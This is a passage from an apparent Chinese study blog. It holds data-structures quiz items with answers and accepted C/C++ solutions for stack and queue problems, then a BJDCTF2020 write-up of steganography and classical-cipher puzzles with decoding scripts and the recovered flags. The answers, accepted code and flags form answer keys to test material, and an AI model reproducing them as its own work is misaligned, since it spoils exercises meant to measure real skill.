c, d, e，经过 Push, Push, Pop, Push, Pop, Push, Push, Pop 操作后，得到的出栈序列是： (D)</p><p>A.b, a, c                   B.b, a, e                   C.b, c, a                   D.b, c, e</p></li><li><p>用S表示入栈操作，X表示出栈操作，若元素入栈的顺序为1234，为了得到1342出栈顺序，相应的S和X的操作串为( )。 (D)</p><p>A.SXSSSXXX                     B.SXSXSXSX</p><p>C.SSSSXXXX                     D.SXSSXSXX</p></li></ol><h2 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h2><p> 4-1 栈的运算遵循  <code>后进先出</code></p><p> 4-2 以下运算实现在链队上的入队列，请在空白处用适当句子予以填充。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void EnQueue(QueptrTp *lq,DataType x)&#123;       LqueueTp *p;       p&#x3D;(LqueueTp *)malloc(sizeof(LqueueTp))       p-&gt;data&#x3D;x; &#x2F;&#x2F; 1分       p-&gt;next&#x3D;NULL;       (lq-&gt;rear)-&gt;next&#x3D;p&#x2F;&#x2F; 1分;       lq-&gt;rear&#x3D;p &#x2F;&#x2F; 1分; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 4-3 以下运算实现在链栈上的初始化，请在空白处用请适当句子予以填充。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct Node&#123;  DataType data;  struct Node *next;&#125;StackNode,*LStackTp;void InitStack(LStackTp &amp;ls)&#123;    ls&#x3D;NULL&#125;&#x2F;&#x2F;3分;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数题"><a href="#函数题" class="headerlink" title="函数题"></a>函数题</h2><h3> <center>舞伴问题 (20 分)</center></h3>假设在周末舞会上，男士和女士们分别进入舞厅，各自排成一队。跳舞开始，依次从男队和女队队头各出一人配成舞伴，若两队初始人数不同，则较长那一队未配对者等待下一轮舞曲。现要求写一算法模拟上述舞伴配对问题。 你需要用队列操作实现上述算法。请完成下面5个函数的操作。 <h4 id="函数接口定义："><a href="#函数接口定义：" class="headerlink" title="函数接口定义："></a>函数接口定义：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int QueueLen(SqQueue Q);&#x2F;&#x2F;队列长度 int EnQueue(SqQueue &amp;Q, Person e);&#x2F;&#x2F;加入队列 int QueueEmpty(SqQueue &amp;Q);&#x2F;&#x2F;队列是否为空 int DeQueue(SqQueue &amp;Q, Person &amp;e);&#x2F;&#x2F;出队列 void DancePartner(Person dancer[], int num); &#x2F;&#x2F;配对舞伴 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>Q</code>：队列</li><li><code>e</code>:参加舞会的人</li><li><code>dancer</code>:全部舞者</li><li><code>num</code>:参加舞会的人数</li></ul><p>**输入说明 先输入参加舞会人数，再分别输入参加舞会人的姓名和性别 **</p><p>**输出说明 先输出配对的男女舞伴，若队伍有剩人，则输出剩下人性别及剩下人数目。 **</p><h4 id="裁判测试程序样例："><a href="#裁判测试程序样例：" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;#define MAXQSIZE 100&#x2F;&#x2F;队列可能达到的最大长度#define OK 1#define ERROR 0#define OVERFLOW -2using namespace std;typedef struct &#123;    char name[20]; &#x2F;&#x2F;姓名    char sex; &#x2F;&#x2F;性别，&#39;F&#39;表示女性，&#39;M&#39;表示男性&#125; Person;&#x2F;&#x2F;- - - - - 队列的顺序存储结构- - - - - typedef struct &#123;    Person data[MAXQSIZE];     int front; &#x2F;&#x2F;头指针    int rear; &#x2F;&#x2F;尾指针&#125; Queue;typedef Queue *SqQueue;SqQueue Mdancers, Fdancers; &#x2F;&#x2F;分别存放男士和女士入队者队列int InitQueue(SqQueue &amp;Q);void DestroyQueue(SqQueue &amp;q);int QueueLen(SqQueue Q);&#x2F;&#x2F;队列长度 int EnQueue(SqQueue &amp;Q, Person e);&#x2F;&#x2F;加入队列 int QueueEmpty(SqQueue &amp;Q);&#x2F;&#x2F;队列是否为空 int DeQueue(SqQueue &amp;Q, Person &amp;e);&#x2F;&#x2F;出队列 void DancePartner(Person dancer[], int num); &#x2F;&#x2F;配对舞伴 int main()&#123;    int i;    int n;    Person dancer[MAXQSIZE];    cin&gt;&gt;n;    for(i&#x3D;0;i&lt;n;i++) cin&gt;&gt; dancer[i].name &gt;&gt; dancer[i].sex;    InitQueue(Mdancers); &#x2F;&#x2F;男士队列初始化    InitQueue(Fdancers); &#x2F;&#x2F;女士队列初始化    cout &lt;&lt; &quot;The dancing partners are:&quot; &lt;&lt; endl;    DancePartner(dancer, n);    if (!QueueEmpty(Fdancers)) &#123;         cout &lt;&lt; &quot;F:&quot;&lt;&lt;QueueLen(Fdancers) ;    &#125; else if (!QueueEmpty(Mdancers)) &#123;         cout &lt;&lt; &quot;M:&quot;&lt;&lt;QueueLen(Mdancers) ;    &#125;    DestroyQueue(Fdancers);    DestroyQueue(Mdancers);    return 0;&#125;int InitQueue(SqQueue &amp;Q) &#123;&#x2F;&#x2F;构造一个空队列Q    Q &#x3D; new Queue; &#x2F;&#x2F;为队列分配一个最大容量为MAXSIZE的数组空间    if (!Q-&gt;data)        exit( OVERFLOW); &#x2F;&#x2F;存储分配失败    Q-&gt;front &#x3D; Q-&gt;rear &#x3D; 0; &#x2F;&#x2F;头指针和尾指针置为零，队列为空    return OK;&#125;void DestroyQueue(SqQueue &amp;q)&#123;    delete q;&#125;&#x2F;* 请在这里填写答案 *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AC代码"><a href="#AC代码" class="headerlink" title="AC代码"></a>AC代码</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int QueueLen(SqQueue Q)&#123;    return (Q-&gt;rear - Q-&gt;front + MAXQSIZE ) % MAXQSIZE;&#125;;&#x2F;&#x2F;队列长度int EnQueue(SqQueue &amp;Q, Person e)&#123;    Q-&gt;rear &#x3D; (Q-&gt;rear + 1)% MAXQSIZE;    Q-&gt;data[Q-&gt;rear] &#x3D; e;    return 0;&#125;;&#x2F;&#x2F;加入队列int QueueEmpty(SqQueue &amp;Q)&#123;    if(Q-&gt;rear&#x3D;&#x3D;Q-&gt;front)    &#123;        return 1;    &#125;    else return 0;&#125;;&#x2F;&#x2F;队列是否为空int DeQueue(SqQueue &amp;Q, Person &amp;e)&#123;    Q-&gt;front&#x3D;(Q-&gt;front+1)%MAXQSIZE;    e&#x3D;Q-&gt;data[Q-&gt;front];    return 0;&#125;;&#x2F;&#x2F;出队列void DancePartner(Person dancer[], int num)&#123;    for (int i&#x3D;0; i&lt;num; i++)    &#123;        if(dancer[i].sex&#x3D;&#x3D;&#39;F&#39;)        &#123;            EnQueue(Fdancers,dancer[i]);        &#125;        if(dancer[i].sex&#x3D;&#x3D;&#39;M&#39;)        &#123;            EnQueue(Mdancers,dancer[i]);        &#125;    &#125;    while(QueueEmpty(Mdancers)!&#x3D;1&amp;&amp;QueueEmpty(Fdancers)!&#x3D;1)    &#123;        Person x,y;        DeQueue(Mdancers, x);        DeQueue(Fdancers, y);        cout&lt;&lt;y.name&lt;&lt;&quot;  &quot;&lt;&lt;x.name&lt;&lt;endl;    &#125;&#125;; &#x2F;&#x2F;配对舞伴 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><H3><CENTER>十进制转二进制（顺序栈设计和应用） (10 分)</CENTER></H3> 设计一个顺序栈，并利用该顺序栈将给定的十进制整整数转换为二进制并输出。 <h4 id="函数接口定义：-1"><a href="#函数接口定义：-1" class="headerlink" title="函数接口定义："></a>函数接口定义：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#define MaxSize 100    &#x2F;* 栈最大容量 *&#x2F;int top;        &#x2F;* 栈顶指针 *&#x2F;int mystack[MaxSize];    &#x2F;* 顺序栈 *&#x2F;&#x2F;*判栈是否为空，空返回true，非空返回false *&#x2F;bool isEmpty();&#x2F;* 元素x入栈 *&#x2F;void Push(int x);&#x2F;* 取栈顶元素 *&#x2F;int getTop();&#x2F;* 删除栈顶元素 *&#x2F;void Pop();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 其中 <code>MaxSize</code> 和 <code>top</code> 分别为栈的最大容量和栈顶指针。数组<code>mystack</code> 用来模拟顺序栈。请实现给出的<code>isEmpty</code>、<code>Push</code>、<code>getTop</code>和<code>Pop</code>这四个函数。 </p><h4 id="裁判测试程序样例：-1"><a href="#裁判测试程序样例：-1" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MaxSize 100        &#x2F;* 栈最大容量 *&#x2F;int top;                &#x2F;* 栈顶指针 *&#x2F;int mystack[MaxSize];    &#x2F;* 顺序栈 *&#x2F;&#x2F;*判栈是否为空，空返回true，非空返回false *&#x2F;bool isEmpty();&#x2F;* 元素x入栈 *&#x2F;void Push(int x);&#x2F;* 取栈顶元素 *&#x2F;int getTop();&#x2F;* 删除栈顶元素 *&#x2F;void Pop();&#x2F;* 十进制正整数转换为二进制 *&#x2F;void dec2bin(int x) &#123;    top &#x3D; -1;            &#x2F;* 初始化栈顶指针 *&#x2F;    while (x) &#123;        Push(x % 2);        x &gt;&gt;&#x3D; 1;    &#125;    while (!isEmpty()) &#123;        int t &#x3D; getTop();        Pop();        printf(&quot;%d&quot;, t);    &#125;    printf(&quot;\n&quot;);&#125;int main(int argc, char const *argv[])&#123;    int n;    while (scanf(&quot;%d&quot;, &amp;n) !&#x3D; EOF) &#123;        dec2bin(n);    &#125;    return 0;&#125;&#x2F;* 请在这里填写答案 *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AC代码："><a href="#AC代码：" class="headerlink" title="AC代码："></a>AC代码：</h4><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">bool isEmpty()&#123;    if (top &#x3D;&#x3D; -1) return true;    else return false;&#125;void Push(int x)&#123;    if (top &#x3D;&#x3D; MaxSize - 1)        return;    else mystack[++top] &#x3D; x;&#125;int getTop()&#123;    if (top &#x3D;&#x3D; -1) return 0;    else return mystack[top];&#125;void Pop()&#123;    if (top &#x3D;&#x3D; -1) return;    else top--;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编程题："><a href="#编程题：" class="headerlink" title="编程题："></a>编程题：</h2><h3><center>7-1 银行业务队列简单模拟 (25 分)</center></h3>设某银行有A、B两个业务窗口，且处理业务的速度不一样，其中A窗口处理速度是B窗口的2倍 —— 即当A窗口每处理完2个顾客时，B窗口处理完1个顾客。给定到达银行的顾客序列，请按业务完成的顺序输出顾客序列。假定不考虑顾客先后到达的时间间隔，并且当不同窗口同时处理完2个顾客时，A窗口顾客优先输出。<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>输入为一行正整数，其中第1个数字N(≤1000)为顾客总数，后面跟着N位顾客的编号。编号为奇数的顾客需要到A窗口办理业务，为偶数的顾客则去B窗口。数字间以空格分隔。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>按业务处理完成的顺序输出顾客的编号。数字间以空格分隔，但最后一个编号后不能有多余的空格。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;malloc.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    int A[1000];    int B[1000];    int N;    int a&#x3D;0, b&#x3D;0, temp;    scanf(&quot;%d&quot;, &amp;N);    for(int i&#x3D;0; i&lt;N; i++)&#123;        scanf(&quot;%d&quot;, &amp;temp);        if(temp % 2 &#x3D;&#x3D; 1)            A[a++] &#x3D; temp;        else            B[b++] &#x3D; temp;    &#125;    int i &#x3D; 0, j &#x3D; 0;    if(a &gt; 1)&#123;&#x2F;&#x2F;A有超过两个人，输出两个        printf(&quot;%d %d&quot;, A[0], A[1]);        i &#x3D; 2;    &#125;    else if(a &gt; 0)&#x2F;&#x2F;A有超过一个人，输出一个        printf(&quot;%d&quot;, A[i++]);    else if(b &gt; 0)&#x2F;&#x2F;A没人，B有人，输出B一个        printf(&quot;%d&quot;, B[j++]);     if(j &#x3D;&#x3D; 0)&#x2F;&#x2F;输出了A没输出B，输出一个B来控制输出一组        printf(&quot; %d&quot;, B[j++]);         while(i &lt; a &amp;&amp; j &lt; b)&#123;        if(i+1 &lt; a)&#123;            printf(&quot; %d %d&quot;,A[i], A[i+1]);            i +&#x3D; 2;        &#125;        else            printf(&quot; %d&quot;, A[i++]);        printf(&quot; %d&quot;, B[j++]);    &#125;    while(i &lt; a)        printf(&quot; %d&quot;, A[i++]);    while(j &lt; b)        printf(&quot; %d&quot;, B[j++]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><center>7-2 堆栈操作合法性 (20 分)</center></h3>假设以`S`和`X`分别表示入栈和出栈操作。如果根据一个仅由`S`和`X`构成的序列，对一个空堆栈进行操作，相应操作均可行（如没有出现删除时栈空）且最后状态也是栈空，则称该序列是合法的堆栈操作序列。请编写程序，输入`S`和`X`序列，判断该序列是否合法。<h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>输入第一行给出两个正整数N和M，其中N是待测序列的个数，M（≤50）是堆栈的最大容量。随后N行，每行中给出一个仅由<code>S</code>和<code>X</code>构成的序列。序列保证不为空，且长度不超过100。</p><h3 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每个序列，在一行中输出<code>YES</code>如果该序列是合法的堆栈操作序列，或<code>NO</code>如果不是。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><pre class="line-numbers language-in" data-language="in"><code class="language-in">4 10SSSXXSXXSXSSSXXSXXSSSSSSSSSSSXSSXXXXXXXXXXXSSSXXSXXX结尾无空行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><pre class="line-numbers language-out" data-language="out"><code class="language-out">YESNONONO结尾无空行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main() &#123;int N, M;cin &gt;&gt; N &gt;&gt; M;while (N--) &#123;string a;int cnt &#x3D; 0, flag &#x3D; 1;cin &gt;&gt; a;for (int i &#x3D; 0; i &lt; a.size(); ++i)if (a[i] &#x3D;&#x3D; &#39;S&#39;) &#123;cnt++;if (cnt &gt; M) &#123;flag &#x3D; 0;cout &lt;&lt; &quot;NO&quot; &lt;&lt; endl;break;&#125;&#125;else &#123;cnt--;if (cnt &lt; 0) &#123;flag &#x3D; 0;cout &lt;&lt; &quot;NO&quot; &lt;&lt; endl;break;&#125;&#125;if (flag)cout &lt;&lt; (cnt &#x3D;&#x3D; 0 ? &quot;YES&quot; : &quot;NO&quot;) &lt;&lt; endl;&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第五章 树与二叉树</title>
      <link href="/2021/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%91%E7%BB%93%E6%9E%84/"/>
      <url>/2021/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%91%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020</title>
      <link href="/2021/12/03/BJDCTF2020/"/>
      <url>/2021/12/03/BJDCTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="1-签到"><a href="#1-签到" class="headerlink" title="1 签到"></a>1 签到</h4><p>一个简单的隐写题目， 压缩包里面有个hello.zip，用winhex打开，可以知道这是一张图片，改成png，打开发现是一个二维码，扫二维码得到flag：<code>xaflag&#123;i_am_a_tupian&#125; </code></p><h4 id="2-藏藏藏"><a href="#2-藏藏藏" class="headerlink" title="2 藏藏藏"></a>2 藏藏藏</h4><p> binwalk发现zip压缩包，使用foremost分离然后解压，得到福利.docx，打开里面又一个二维码，扫码得到<code>flag&#123;you are the best!&#125;</code></p><h4 id="3-认真你就输了"><a href="#3-认真你就输了" class="headerlink" title="3 认真你就输了"></a>3 认真你就输了</h4><p> 解压出来xls，binwalk分离文件得到flag.txt，打开得到flag：<code>flag&#123;M9eVfi2Pcs#&#125; </code></p><h4 id="4-你猜我是个啥"><a href="#4-你猜我是个啥" class="headerlink" title="4 你猜我是个啥"></a>4 你猜我是个啥</h4><p>是一个无法打开的zip压缩包，file命令查看发现是个png图片，直接cat即可得到flag.</p><h4 id="5-鸡你太美"><a href="#5-鸡你太美" class="headerlink" title="5 鸡你太美"></a>5 鸡你太美</h4><p><code>GIF89a</code>这个文件头丢失,<code>winhex</code>打开，填上4个字节，修复文件头，得到<code>flag</code></p><h4 id="6-纳尼"><a href="#6-纳尼" class="headerlink" title="6 纳尼"></a>6 纳尼</h4><p>和上一个题一样，还是缺了4位二进制数，打开winhex修复gif文件头，补充47,49,46,38，然后把 gif 不同帧连起来得到一个base64，Q1RGe3dhemdfYmFvX3FpYW5nX2lzX3NhZH0=解密后得到一段有问题的flag。<code>CTF&#123;wazg_bao_qiang_is_sad&#125;</code>这个实际上有点问题，我怀疑是我输入出错了<code>CTF&#123;wang_bao_qiang_is_sad&#125;</code></p><p>王宝强很悲伤。</p><h4 id="7-just-a-rar"><a href="#7-just-a-rar" class="headerlink" title="7 just a rar"></a>7 just a rar</h4><p>解压出来一个rar名称为 4 位数，爆破得到密码：2016，一张青雉的图片，用 stegsolve 打开使用 Analyse 分析，找到<code>flag &#123;Wadf_123&#125;</code></p><h4 id="8-一叶障目"><a href="#8-一叶障目" class="headerlink" title="8 一叶障目"></a>8 一叶障目</h4><p>png 的 CRC 校验问题，图片的宽高被改了导致无法打开，这里有我之前在一个ctf地图平台上找到了一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"图片地址："</span><span class="token punctuation">)</span>fr <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token punctuation">:</span> <span class="token builtin">bytearray</span> <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">0x0c</span><span class="token punctuation">:</span><span class="token number">0x1d</span><span class="token punctuation">]</span><span class="token punctuation">)</span>crc32key <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">0x1d</span><span class="token punctuation">:</span><span class="token number">0x21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#原来的代码: crc32key = eval(str(fr[29:33]).replace('\\x','').replace("1b'",'0x').replace("'",''))</span>n <span class="token operator">=</span> <span class="token number">4095</span><span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    width <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        height <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>        crc32result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>            newpic <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>fr<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            fw <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>newpic<span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag <code>xaflag&#123;66666&#125;</code></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h4 id="1-签到-1"><a href="#1-签到-1" class="headerlink" title="1 签到"></a>1 签到</h4><p>十六进制转字符串即可得flag   <code>BJD&#123;We1c0me_t4_BJDCTF&#125;</code></p><h4 id="2-编码与调制"><a href="#2-编码与调制" class="headerlink" title="2 编码与调制"></a>2 编码与调制</h4><blockquote><p> 本题灵感来自2019年第三届i春秋的11月月赛，主要是想对曼切斯特编码进行考察，其中为了提供一下思路，给了一张code的图片作为提示，当然也可以直接自行百度这种编码方式，毕竟他的编码方式也很有特点，仅采用了4种字符，百度一下也可以找到解决方案 编码规则，直接复制的百度百科 在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“1”，从低到高跳变表示“0”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。 编程思路： 而我们在编程实现时，也很简单只要先将明文转成二进制（也就是先进行NRZ编码），而后对于其中的高电平‘1’，用‘10’替换，低电平‘0’，用‘01’替换，获得一串新的二进制比特流，最后再将其进行16进制封装即可 解码思路： 解码也就是一个逆过程，先将hex转成bin，在一步步替换‘10’为‘1’，‘01’为‘0’ 下面给出解密脚本： </p></blockquote><p>直接放官方的答案吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msg<span class="token operator">=</span><span class="token number">0x2559659965656a9a65656996696965a6695669a9695a699569666a5a6a6569666a59695a69aa696569666aa6</span>s<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>r<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> <span class="token string">'1'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> <span class="token string">'0'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**BJD{DifManchestercode} **</p><h4 id="3-Polybius"><a href="#3-Polybius" class="headerlink" title="3 Polybius"></a>3 Polybius</h4><blockquote><p>密文：ouauuuoooeeaaiaeauieuooeeiea hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ= 首先将hint base64解密查看提示：The length of this plaintext: 14 而后再观察一下发现密文长度时28位，所以猜测是棋盘密码（额，其实题目就已经提示加密方式了） 观察发现一共有五个字母重复出现在密文中，所以可能的加密表是aeiou，但是解出结果会发现是乱码，所以可以尝试爆破，一共也就5！种情况。 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolskey <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>cipher <span class="token operator">=</span> <span class="token string">"ouauuuoooeeaaiaeauieuooeeiea"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span><span class="token string">'aeiou'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span 